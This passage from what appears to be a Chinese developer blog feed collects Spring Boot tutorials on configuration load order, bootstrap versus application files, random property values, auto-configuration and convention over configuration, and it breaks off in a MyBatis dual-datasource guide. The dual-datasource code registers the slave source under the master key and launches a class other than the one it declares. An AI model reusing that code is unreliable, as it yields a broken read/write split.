        <content type="html"><![CDATA[<p>使用 Spring Boot 会涉及到各种各样的配置，如开发、测试、线上就至少 3 套配置信息了。Spring Boot 可以轻松的帮助我们使用相同的代码就能使开发、测试、线上环境使用不同的配置。</p><p><strong>在 Spring Boot 里面，可以使用以下几种方式来加载配置。本章内容基于 Spring Boot 2.0 进行详解。</strong></p><p>1、properties文件；</p><p>2、YAML文件；</p><p>3、系统环境变量；</p><p>4、命令行参数；</p><p>等等……</p><p><strong>我们可以在 Spring Beans 里面直接使用这些配置文件中加载的值，如：</strong></p><p>1、使用 <code>@Value</code> 注解直接注入对应的值，这能获取到 Spring 中 <code>Environment</code> 的值；</p><p>2、使用 <code>@ConfigurationProperties</code> 注解把对应的值绑定到一个对象；</p><p>3、直接获取注入 <code>Environment</code> 进行获取；</p><p>配置属性的方式很多，Spring boot使用了一种独有的 <code>PropertySource</code> 可以很方便的覆盖属性的值。</p><p><strong>配置属性加载的顺序如下：</strong></p><pre class="line-numbers language-none"><code class="language-none">1、开发者工具 &#96;Devtools&#96; 全局配置参数；2、单元测试上的 &#96;@TestPropertySource&#96; 注解指定的参数；3、单元测试上的 &#96;@SpringBootTest&#96; 注解指定的参数；4、命令行指定的参数，如 &#96;java -jar springboot.jar --name&#x3D;&quot;Java&quot;&#96;；5、命令行中的 &#96;SPRING_APPLICATION_JSONJSON&#96; 指定参数, 如 &#96;java -Dspring.application.json&#x3D;&#39;&#123;&quot;name&quot;:&quot;Java&quot;&#125;&#39; -jar springboot.jar&#96;6、&#96;ServletConfig&#96; 初始化参数；7、&#96;ServletContext&#96; 初始化参数；8、JNDI参数（如 &#96;java:comp&#x2F;env&#x2F;spring.application.json&#96;）；9、Java系统参数（来源：&#96;System.getProperties()&#96;）；10、操作系统环境变量参数；11、&#96;RandomValuePropertySource&#96; 随机数，仅匹配：&#96;ramdom.*&#96;；12、JAR包外面的配置文件参数（&#96;application-&#123;profile&#125;.properties（YAML）&#96;）13、JAR包里面的配置文件参数（&#96;application-&#123;profile&#125;.properties（YAML）&#96;）14、JAR包外面的配置文件参数（&#96;application.properties（YAML）&#96;）15、JAR包里面的配置文件参数（&#96;application.properties（YAML）&#96;）16、&#96;@Configuration&#96;配置文件上 &#96;@PropertySource&#96; 注解加载的参数；17、默认参数（通过 &#96;SpringApplication.setDefaultProperties&#96; 指定）；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>数字小的优先级越高，即数字小的会覆盖数字大的参数值，我们来实践下，验证以上配置参数的加载顺序。</strong></p><p>1、在主应用程序中添加 Java 系统参数。</p><pre class="line-numbers language-none"><code class="language-none">@Beanpublic CommandLineRunner commandLineRunner() &#123;return (args) -&gt; &#123;System.setProperty(&quot;name&quot;, &quot;javastack-system-properties&quot;);&#125;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、在 application.properties 文件中添加属性。</p><pre class="line-numbers language-none"><code class="language-none">name &#x3D; javastack-application<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、在 application-dev.properties 文件中添加属性。</p><pre class="line-numbers language-none"><code class="language-none">name &#x3D; javastack-application-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4、添加测试类</p><pre class="line-numbers language-none"><code class="language-none">@RunWith(SpringRunner.class)@SpringBootTest(value &#x3D; &#123; &quot;name&#x3D;javastack-test&quot;, &quot;sex&#x3D;1&quot; &#125;)@ActiveProfiles(&quot;dev&quot;)public class SpringBootBestPracticeApplicationTests &#123;@Value(&quot;$&#123;name&#125;&quot;)private String name;@Testpublic void test() &#123;System.out.println(&quot;name is &quot; + name);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行 test 单元测试，程序输出：</p><pre class="line-numbers language-none"><code class="language-none">name is javastack-test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据以上参数动态调整，发现参数会被正确被覆盖。了解了 Spring Boot 各种配置的加载顺序，如果配置被覆盖了我们就知道是什么问题了。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 配置文件 bootstrap vs application 到底有什么区别？</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%20bootstrap%20vs%20application%20%E5%88%B0%E5%BA%95%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%20bootstrap%20vs%20application%20%E5%88%B0%E5%BA%95%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>用过 Spring Boot 的都知道在 Spring Boot 中有以下两种配置文件</p><ul><li>bootstrap (.yml 或者 .properties)</li><li>application (.yml 或者 .properties)</li></ul><p>为什么会有这两种配置文件呢？大家都清楚它们的区别和具体使用场景吗？</p><h4 id="bootstrap-application-的区别"><a href="#bootstrap-application-的区别" class="headerlink" title="bootstrap&#x2F; application 的区别"></a>bootstrap&#x2F; application 的区别</h4><p>特意去翻了下 Spring Boot 的官方文档，没有找到关于这两种文件的具体定义，然后再翻了下 Spring Cloud 的官方文档找到了它们的区别。</p><blockquote><p><a href="https://cloud.spring.io/spring-cloud-static/Greenwich.SR1/single/spring-cloud.html#_the_bootstrap_application_context">https://cloud.spring.io/spring-cloud-static/Greenwich.SR1/single/spring-cloud.html#_the_bootstrap_application_context</a></p></blockquote><p>认真阅读了下文档，原文大概意思是这样。</p><blockquote><p>Spring Cloud 构建于 Spring Boot 之上，在 Spring Boot 中有两种上下文，一种是 bootstrap, 另外一种是 application, bootstrap 是应用程序的父上下文，也就是说 bootstrap 加载优先于 applicaton。bootstrap 主要用于从额外的资源来加载配置信息，还可以在本地外部配置文件中解密属性。这两个上下文共用一个环境，它是任何Spring应用程序的外部属性的来源。bootstrap 里面的属性会优先加载，它们默认也不能被本地相同配置覆盖。</p></blockquote><p><strong>因此，对比 application 配置文件，bootstrap 配置文件具有以下几个特性。</strong></p><ul><li>boostrap 由父 ApplicationContext 加载，比 applicaton 优先加载</li><li>boostrap 里面的属性不能被覆盖</li></ul><h4 id="bootstrap-application-的应用场景"><a href="#bootstrap-application-的应用场景" class="headerlink" title="bootstrap&#x2F; application 的应用场景"></a>bootstrap&#x2F; application 的应用场景</h4><p>application 配置文件这个容易理解，主要用于 Spring Boot 项目的自动化配置。</p><p>bootstrap 配置文件有以下几个应用场景。</p><ul><li>使用 Spring Cloud Config 配置中心时，这时需要在 bootstrap 配置文件中添加连接到配置中心的配置属性来加载外部配置中心的配置信息；</li><li>一些固定的不能被覆盖的属性</li><li>一些加密&#x2F;解密的场景；</li></ul><p>以下这个截图是一个国外网友问了一个 Spring Cloud 工程师得到的回答。</p><p><img src="http://img.javastack.cn/18-4-2/38651438.jpg"></p><ul><li>Spring Boot 读取配置的几种方式</li><li>Spring Boot 如何做参数校验？</li><li>Spring Boot 最核心的 25 个注解！</li><li>Spring Boot 2.x 启动全过程源码分析</li><li>Spring Boot 2.x 新特性总结及迁移指南</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 配置随机数技巧</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%8A%80%E5%B7%A7/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>Spring Boot支持在系统加载的时候配置随机数。</p><p>添加config&#x2F;random.properties文件，添加以下内容：</p><pre class="line-numbers language-none"><code class="language-none">#随机32位MD5字符串user.random.secret&#x3D;$&#123;random.value&#125;#随机int数字user.random.intNumber&#x3D;$&#123;random.int&#125;#随机long数字user.random.longNumber&#x3D;$&#123;random.long&#125;#随便uuiduser.random.uuid&#x3D;$&#123;random.uuid&#125;#随机10以内的数字user.random.lessTen&#x3D;$&#123;random.int(10)&#125;#随机1024~65536之内的数字user.random.range&#x3D;$&#123;random.int[1024,65536]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加绑定类：</p><pre class="line-numbers language-none"><code class="language-none">import org.springframework.boot.context.properties.ConfigurationProperties;import org.springframework.context.annotation.PropertySource;import org.springframework.stereotype.Component;&#x2F;** *  *&#x2F;@Component@ConfigurationProperties(prefix &#x3D; &quot;user.random&quot;)@PropertySource(value &#x3D; &#123; &quot;config&#x2F;random.properties&quot; &#125;)public class RandomConfig &#123;private String secret;private int intNumber;private int lessTen;private int range;private long longNumber;private String uuid;public String getSecret() &#123;return secret;&#125;public void setSecret(String secret) &#123;this.secret &#x3D; secret;&#125;public int getIntNumber() &#123;return intNumber;&#125;public void setIntNumber(int intNumber) &#123;this.intNumber &#x3D; intNumber;&#125;public int getLessTen() &#123;return lessTen;&#125;public void setLessTen(int lessTen) &#123;this.lessTen &#x3D; lessTen;&#125;public int getRange() &#123;return range;&#125;public void setRange(int range) &#123;this.range &#x3D; range;&#125;public long getLongNumber() &#123;return longNumber;&#125;public void setLongNumber(long longNumber) &#123;this.longNumber &#x3D; longNumber;&#125;public String getUuid() &#123;return uuid;&#125;public void setUuid(String uuid) &#123;this.uuid &#x3D; uuid;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出如下：</p><pre class="line-numbers language-none"><code class="language-none">secret&#x3D;83a5c3402ef936a37842dc6de3d1af0fintNumber&#x3D;1816149855lessTen&#x3D;1range&#x3D;37625longNumber&#x3D;8449008776720010146uuid&#x3D;e5bc2091-1599-45b1-abd7-e3721ac77e6b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体的生成细节可以参考Spring Boot的配置类：</p><p><code>org.springframework.boot.context.config.RandomValuePropertySource</code></p><p>来看下它的源码，实现其实很简单。</p><pre class="line-numbers language-none"><code class="language-none">public RandomValuePropertySource(String name) &#123;super(name, new Random());&#125;private Object getRandomValue(String type) &#123;if (type.equals(&quot;int&quot;)) &#123;return getSource().nextInt();&#125;if (type.equals(&quot;long&quot;)) &#123;return getSource().nextLong();&#125;String range &#x3D; getRange(type, &quot;int&quot;);if (range !&#x3D; null) &#123;return getNextIntInRange(range);&#125;range &#x3D; getRange(type, &quot;long&quot;);if (range !&#x3D; null) &#123;return getNextLongInRange(range);&#125;if (type.equals(&quot;uuid&quot;)) &#123;return UUID.randomUUID().toString();&#125;return getRandomBytes();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实就是使用了 Java 自带的 <code>java.util.Random</code> 和 <code>java.util.UUID</code> 等工具类，实现很简单，这里就不再详细解析了，大家可以自己去看下这个类的实现。</p><p>随机数的生成配置就是这么点了，我知道的是可以随机生成应用程序端口，其他的还真没用到。</p><p>@程序猿 你们还知道其他的随机数应用么？</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 面试，一个问题就干趴下了！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E9%9D%A2%E8%AF%95%EF%BC%8C%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E5%B0%B1%E5%B9%B2%E8%B6%B4%E4%B8%8B%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E9%9D%A2%E8%AF%95%EF%BC%8C%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E5%B0%B1%E5%B9%B2%E8%B6%B4%E4%B8%8B%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>最近栈长面试了不少人，其中不乏说对 Spring Boot 非常熟悉的，然后当我问到一些 Spring Boot 核心功能和原理的时候，没人能说得上来，或者说不到点上，可以说一个问题就问趴下了！</p><p>这是我的问题：</p><p><strong>我看你上面写了熟悉 Spring Boot，那你能讲下为什么我们要用 Spring Boot 吗？</strong></p><p>下面我列几个最常见的三个回答：</p><p><strong>A：Spring Boot 最主要是不用 XML 配置，可以用 Java 来配置 bean，省去了许多配置文件。</strong></p><p>我又问：Spring 本身就可以用 Java 配置代替 XML 配置，和 Spring Boot 有什么关系呢？</p><p>然后对方就吱吱唔唔了……</p><p><strong>B：Spring Boot 我们用来做 Spring Cloud 微服务。</strong></p><p>我又问：微服务和 Spring Boot 有什么关系？不用 Spring Boot 行不行？</p><p>然后对方就吱吱唔唔了……</p><p><strong>C：Spring Boot 可以打 jar 包部署，内部集成了Tomcat。</strong></p><p>这个确实是 Spring Boot 的特色，但是我还是觉得没有答到关键点上。</p><p>然后我继续问，如果不考虑打 jar 包部署呢，然后就没然后了……</p><p>为什么我们要用 Spring Boot，显然上面三个求职者没有答到关键点上，Spring Boot 最重要的功能是：<strong>自动配置</strong>。</p><p><strong>为什么说是自动配置？</strong></p><p>Spring Boot 的开启注解是：@SpringBootApplication，其实它就是由下面三个注解组成的：</p><ul><li>@Configuration</li><li>@ComponentScan</li><li>@EnableAutoConfiguration</li></ul><p>上面三个注解，前面两个都是 Spring 自带的，和 Spring Boot 无关，所以说上面的回答的不是在点上。具体请看这篇文章：<a href="https://mp.weixin.qq.com/s/kNvy_0jb4oJtYdaxryq5xg">Spring Boot 最核心的 3 个注解详解</a>。</p><p>所以说 Spring Boot 最最核心的就是这个 <code>@EnableAutoConfiguration</code> 注解了，它能根据类路径下的 jar 包和配置动态加载配置和注入bean。</p><p>举个例子，比如我在 lib 下放一个 druid 连接池的 jar 包，然后在 application.yml 文件配置 druid 相关的参数，Spring Boot 就能够自动配置所有我们需要的东西，如果我把 jar 包拿掉或者把参数去掉，那 Spring Boot 就不会自动配置。</p><p>这样我们就能把许多功能做成公共的自动配置的启动器（starters），其实 druid 连接池就是这么做的，它提供了针对 Spring Boot 的启动器：druid-spring-boot-starter。</p><p>有了这个自动配置的启动器，我们就能非常简单的使用它，</p><p>先添加 jar 包依赖：</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;   &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;   &lt;artifactId&gt;druid-spring-boot-starter&lt;&#x2F;artifactId&gt;   &lt;version&gt;1.1.10&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再添加相关参数：</p><pre class="line-numbers language-none"><code class="language-none">spring.datasource.url&#x3D; spring.datasource.username&#x3D;spring.datasource.password&#x3D;……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果是传统的项目，我们要自己手动写一大堆的配置，而且还不灵活，有了这个启动器，我们就可以做到简单集成。具体大家可以看 druid-spring-boot-starter 是怎么实现的，也可以参考之前写的文章：<a href="https://mp.weixin.qq.com/s/gs2zLSH6m9ijO0-pP2sr9Q">Spring Boot自动配置原理、实战</a>。</p><p>所以，这才是 Spring Boot 的核心，这才是我们为什么使用 Spring Boot 的原因。如果答不到这个关键点，那真没有掌握到 Spring Boot 的核心所在。</p><ul><li>Spring Boot 读取配置的几种方式</li><li>Spring Boot 如何做参数校验？</li><li>Spring Boot 最核心的 25 个注解！</li><li>Spring Boot 2.x 启动全过程源码分析</li><li>Spring Boot 2.x 新特性总结及迁移指南</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 面试，一个问题就干趴下了！（下）</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E9%9D%A2%E8%AF%95%EF%BC%8C%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E5%B0%B1%E5%B9%B2%E8%B6%B4%E4%B8%8B%E4%BA%86%EF%BC%81%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E9%9D%A2%E8%AF%95%EF%BC%8C%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E5%B0%B1%E5%B9%B2%E8%B6%B4%E4%B8%8B%E4%BA%86%EF%BC%81%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/20190402135751.png"></p><p>哈哈，上墙的朋友开不开森？</p><p>不错，约定优（大）于配置确实是 Spring Boot 整个框架的核心思想。</p><p><strong>那么怎么理解约定优于配置呢？</strong></p><p>百度百科定义：</p><blockquote><p>约定优于配置（convention over configuration），也称作按约定编程，是一种软件设计范式，旨在减少软件开发人员需做决定的数量，获得简单的好处，而又不失灵活性。</p></blockquote><p>总结就是两点：</p><p>1、约定一些推荐的默认配置；</p><p>2、开发人员只需要规定不符约定的部分；</p><p>这样做的好处就是，如果约定的默认配置符合我们的要求，省略即可，反之，再进行额外配置。</p><p>从 Spring Boot 中提供的默认的配置文件（application.properties&#x2F;yml），再到默认值自动配置，都可以看出约定带来的便利，以及节省大量的配置。</p><p>来看下 Spring Boot 中一个自动配置的源码实例吧：</p><pre class="line-numbers language-none"><code class="language-none">@Configuration@ConditionalOnClass(&#123; Servlet.class, StandardServletMultipartResolver.class,MultipartConfigElement.class &#125;)@ConditionalOnProperty(prefix &#x3D; &quot;spring.servlet.multipart&quot;, name &#x3D; &quot;enabled&quot;, matchIfMissing &#x3D; true)@ConditionalOnWebApplication(type &#x3D; Type.SERVLET)@EnableConfigurationProperties(MultipartProperties.class)public class MultipartAutoConfiguration &#123;private final MultipartProperties multipartProperties;public MultipartAutoConfiguration(MultipartProperties multipartProperties) &#123;this.multipartProperties &#x3D; multipartProperties;&#125;@Bean@ConditionalOnMissingBeanpublic MultipartConfigElement multipartConfigElement() &#123;return this.multipartProperties.createMultipartConfig();&#125;@Bean(name &#x3D; DispatcherServlet.MULTIPART_RESOLVER_BEAN_NAME)@ConditionalOnMissingBean(MultipartResolver.class)public StandardServletMultipartResolver multipartResolver() &#123;StandardServletMultipartResolver multipartResolver &#x3D; new StandardServletMultipartResolver();multipartResolver.setResolveLazily(this.multipartProperties.isResolveLazily());return multipartResolver;&#125;&#125;@ConfigurationProperties(prefix &#x3D; &quot;spring.servlet.multipart&quot;, ignoreUnknownFields &#x3D; false)public class MultipartProperties &#123;&#x2F;** * Whether to enable support of multipart uploads. *&#x2F;private boolean enabled &#x3D; true;&#x2F;** * Intermediate location of uploaded files. *&#x2F;private String location;&#x2F;** * Max file size. Values can use the suffixes &quot;MB&quot; or &quot;KB&quot; to indicate megabytes or * kilobytes, respectively. *&#x2F;private String maxFileSize &#x3D; &quot;1MB&quot;;&#x2F;** * Max request size. Values can use the suffixes &quot;MB&quot; or &quot;KB&quot; to indicate megabytes or * kilobytes, respectively. *&#x2F;private String maxRequestSize &#x3D; &quot;10MB&quot;;&#x2F;** * Threshold after which files are written to disk. Values can use the suffixes &quot;MB&quot; * or &quot;KB&quot; to indicate megabytes or kilobytes, respectively. *&#x2F;private String fileSizeThreshold &#x3D; &quot;0&quot;;&#x2F;** * Whether to resolve the multipart request lazily at the time of file or parameter * access. *&#x2F;private boolean resolveLazily &#x3D; false;&#x2F;&#x2F; get&#x2F;set&#x2F;etc..&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是一个文件上传的自动配置类，约定了：</p><p>1、约定了配置参数以 <code>spring.servlet.multipart</code> 前缀开始；</p><p>2、约定了很多默认配置，如：默认上传文件大小为 1M；</p><p>3、约定了所有的参数配置类名都是 *Properties；</p><p>4、约定了所有的自动配置类名都是 *AutoConfiguration；</p><p>5、约定了所有自动配置类配置在：&#x2F;META-INF&#x2F;spring.factories；</p><p>等等……</p><p>这样我们做一个文件上传操作几乎不用写任何配置了，除非满足不了需求，如：现在文件上传 1M 太小了，再加一行自定义配置即可，我们也可以按约定编写其他自动配置。</p><p>如果还不能理解，再来看 Maven 怎么做的，Maven 简直把约定大于配置的思想体现淋漓尽致。</p><p><img src="http://img.javastack.cn/20190402143208.png"></p><p><img src="http://img.javastack.cn/20190402143236.png"></p><p>Maven规定了哪个目录放什么文件，哪个文件做什么用，Maven会自动去处理，不需要我们再额外配置，其实我们也没有额外配置的需要，至少栈长我现在还没有遇到过。如果这些目录都让你来通过配置文件来配置，而每个项目配置的又不一样，你会不会想要崩溃？</p><p>其实这也不是新技术，只是一种设计思想，早在 JDK 1.5 中添加的《<a href="https://mp.weixin.qq.com/s/FSrtDEwILSM-Q2ocnZdNbA">Java注解</a>》就是很好的体现。</p><p>关于 “约定优于配置” 的思想，你还有什么好的想法，欢迎留言分享~</p><ul><li>Spring Boot 读取配置的几种方式</li><li>Spring Boot 如何做参数校验？</li><li>Spring Boot 最核心的 25 个注解！</li><li>Spring Boot 2.x 启动全过程源码分析</li><li>Spring Boot 2.x 新特性总结及迁移指南</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 集成Mybatis双数据源</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E9%9B%86%E6%88%90Mybatis%E5%8F%8C%E6%95%B0%E6%8D%AE%E6%BA%90/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E9%9B%86%E6%88%90Mybatis%E5%8F%8C%E6%95%B0%E6%8D%AE%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<p>这里用到了Spring Boot + Mybatis + DynamicDataSource配置动态双数据源，可以动态切换数据源实现数据库的读写分离。</p><h2 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h2><p>加入Mybatis启动器，这里添加了Druid连接池、Oracle数据库驱动为例。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.mybatis.spring.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;mybatis-spring-boot-starter&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt;&lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;&lt;artifactId&gt;druid&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt;&lt;groupId&gt;com.oracle&lt;&#x2F;groupId&gt;&lt;artifactId&gt;ojdbc6&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加启动类"><a href="#添加启动类" class="headerlink" title="添加启动类"></a>添加启动类</h2><pre class="line-numbers language-none"><code class="language-none">@EnableMybatis@EnableTransactionManagement@SpringBootApplication(exclude &#x3D; &#123; DataSourceAutoConfiguration.class &#125;)public class Application &#123;public static void main(String[] args) &#123;SpringApplication.run(ServiceApplication.class, args);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>@SpringBootApplication(exclude &#x3D; { DataSourceAutoConfiguration.class })：<br>这里用到了双数据源，需要排除数据源的自动配置，如果只有一个数据源用Spring Boot的自动配置就行。</p><p>@EnableTransactionManagement：开启事务支持。</p><p>@EnableMybatis：开启Mybatis功能</p><pre class="line-numbers language-none"><code class="language-none">@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Documented@Import(MybatisConfig.class)public @interface EnableMybatis &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Mybatis配置类"><a href="#Mybatis配置类" class="headerlink" title="Mybatis配置类"></a>Mybatis配置类</h2><pre class="line-numbers language-none"><code class="language-none">@Configuration@MapperScan(basePackages &#x3D; DSConfig.BASE_PACKAGES)public class MybatisConfig implements DSConfig &#123;@Primary@Beanpublic DynamicDataSource dynamicDataSource(@Qualifier(DB_MASTER) DataSource master,@Qualifier(DB_SLAVE) DataSource slave) &#123;Map&lt;Object, Object&gt; dsMap &#x3D; new HashMap&lt;&gt;();dsMap.put(DB_MASTER, master);dsMap.put(DB_MASTER, slave);DynamicDataSource dynamicDataSource &#x3D; new DynamicDataSource();dynamicDataSource.setDefaultTargetDataSource(master);dynamicDataSource.setTargetDataSources(dsMap);return dynamicDataSource;&#125;@Beanpublic PlatformTransactionManager transactionManager(DynamicDataSource dynamicDataSource) &#123;return new DataSourceTransactionManager(dynamicDataSource);&#125;@Beanpublic SqlSessionFactory sqlSessionFactory(DynamicDataSource dynamicDataSource)throws Exception &#123;SqlSessionFactoryBean sessionFactory &#x3D; new SqlSessionFactoryBean();sessionFactory.setDataSource(dynamicDataSource);sessionFactory.setMapperLocations(((ResourcePatternResolver) new PathMatchingResourcePatternResolver()).getResources(DSConfig.MAPPER_LOCATIONS));return sessionFactory.getObject();&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DSConfig常量类：</p><pre class="line-numbers language-none"><code class="language-none">public interface DSConfig &#123;String DS_PREFIX &#x3D; &quot;spring.datasource&quot;;String DS_ACTIVE &#x3D; &quot;active&quot;;String DB_MASTER &#x3D; &quot;db-master&quot;;String DB_SLAVE &#x3D; &quot;db-slave&quot;;String DRUID &#x3D; &quot;druid&quot;;String DRUID_MONITOR_USERNAME &#x3D; &quot;spring.druid.username&quot;;String DRUID_MONITOR_PASSWORD &#x3D; &quot;spring.druid.password&quot;;String DRUID_MONITOR_URL &#x3D; &quot;&#x2F;druid&#x2F;*&quot;;String DRUID_FILTER_EXCLUSIONS &#x3D; &quot;*.js,*.gif,*.jpg,*.png,*.css,*.ico,&#x2F;druid&#x2F;*&quot;;String DRUID_FILTER_URL &#x3D; &quot;&#x2F;*&quot;;String BASE_PACKAGES &#x3D; &quot;com.example.**.mapper&quot;;String MAPPER_LOCATIONS &#x3D; &quot;mapper&#x2F;**&#x2F;*.xml&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="连接池配置类"><a href="#连接池配置类" class="headerlink" 